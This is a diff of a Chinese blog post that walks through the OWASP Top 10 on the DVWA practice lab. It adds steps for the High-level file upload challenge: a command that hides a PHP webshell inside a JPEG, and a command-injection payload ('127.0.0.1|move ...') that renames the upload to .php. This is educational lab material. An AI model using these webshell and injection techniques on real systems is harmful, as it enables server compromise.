@@ -15,7 +15,7 @@
 <meta property="og:description" content="面试的要求中经常可以看到OWASP-Top10，于是打算好好学习一下。">
 <meta property="og:locale" content="en_US">
 <meta property="article:published_time" content="2023-05-06T06:11:14.000Z">
-<meta property="article:modified_time" content="2023-05-06T09:14:41.783Z">
+<meta property="article:modified_time" content="2023-05-09T06:38:47.061Z">
 <meta property="article:author" content="Lunatic">
 <meta property="article:tag" content="Skills">
 <meta property="article:tag" content="Web">
@@ -150,11 +150,37 @@
 
 <h3 id="High-1"><a href="#High-1" class="headerlink" title="High"></a>High</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>( <span class="keyword">isset</span>( <span class="variable">$_POST</span>[ <span class="string">&#x27;Upload&#x27;</span> ] ) ) &#123;</span><br><span class="line">    <span class="comment">// Where are we going to be writing to?</span></span><br><span class="line">    <span class="variable">$target_path</span>  = DVWA_WEB_PAGE_TO_ROOT . <span class="string">&quot;hackable/uploads/&quot;</span>;</span><br><span class="line">    <span class="variable">$target_path</span> .= <span class="title function_ invoke__">basename</span>( <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ] );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// File information</span></span><br><span class="line">    <span class="variable">$uploaded_name</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;name&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_ext</span>  = <span class="title function_ invoke__">substr</span>( <span class="variable">$uploaded_name</span>, <span class="title function_ invoke__">strrpos</span>( <span class="variable">$uploaded_name</span>, <span class="string">&#x27;.&#x27;</span> ) + <span class="number">1</span>);</span><br><span class="line">    <span class="variable">$uploaded_size</span> = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;size&#x27;</span> ];</span><br><span class="line">    <span class="variable">$uploaded_tmp</span>  = <span class="variable">$_FILES</span>[ <span class="string">&#x27;uploaded&#x27;</span> ][ <span class="string">&#x27;tmp_name&#x27;</span> ];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Is it an image?</span></span><br><span class="line">    <span class="keyword">if</span>( ( <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;jpeg&quot;</span> || <span class="title function_ invoke__">strtolower</span>( <span class="variable">$uploaded_ext</span> ) == <span class="string">&quot;png&quot;</span> ) &amp;&amp;</span><br><span class="line">        ( <span class="variable">$uploaded_size</span> &lt; <span class="number">100000</span> ) &amp;&amp;</span><br><span class="line">        <span class="title function_ invoke__">getimagesize</span>( <span class="variable">$uploaded_tmp</span> ) ) &#123;</span><br><span class="line">		<span class="comment">//getimagesize(string filename) 函数会读取文件头</span></span><br><span class="line">        <span class="comment">// Can we move the file to the upload folder?</span></span><br><span class="line">        <span class="keyword">if</span>( !<span class="title function_ invoke__">move_uploaded_file</span>( <span class="variable">$uploaded_tmp</span>, <span class="variable">$target_path</span> ) ) &#123;</span><br><span class="line">            <span class="comment">// No</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// Yes!</span></span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;&lt;pre&gt;<span class="subst">&#123;$target_path&#125;</span> succesfully uploaded!&lt;/pre&gt;&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">// Invalid file</span></span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;pre&gt;Your image was not uploaded. We can only accept JPEG or PNG images.&lt;/pre&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure>
 
+<p>getimagesize(string filename)函数会通过读取文件头，返回图片的长、宽等信息</p>
+<p>所以这里我们可以通过上传图片马的方式，然后通过之前的命令执行漏洞来修改文件后缀为php</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">copy mm.jpg/b + shell.php /a 3.jpg</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#然后在命令执行中输入以下命令</span></span><br><span class="line">127.0.0.1|move …/…/hackable/uploads/3.jpg …/…/hackable/uploads/shell.php</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://goodlunatic.github.io/2023/05/06/OWASP-Top10%E5%8F%8A%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" data-id="clhflq3530013xw3z2yi590se" class="article-share-link">Share</a>
+      <a data-url="https://goodlunatic.github.io/2023/05/06/OWASP-Top10%E5%8F%8A%E9%9D%B6%E5%9C%BA%E9%80%9A%E5%85%B3%E8%AF%A6%E8%A7%A3/" data-id="clhg7j4je0018v83zd7fb4ra7" class="article-share-link">Share</a>
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Skills/" rel="tag">Skills</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/Web/" rel="tag">Web</a></li></ul>
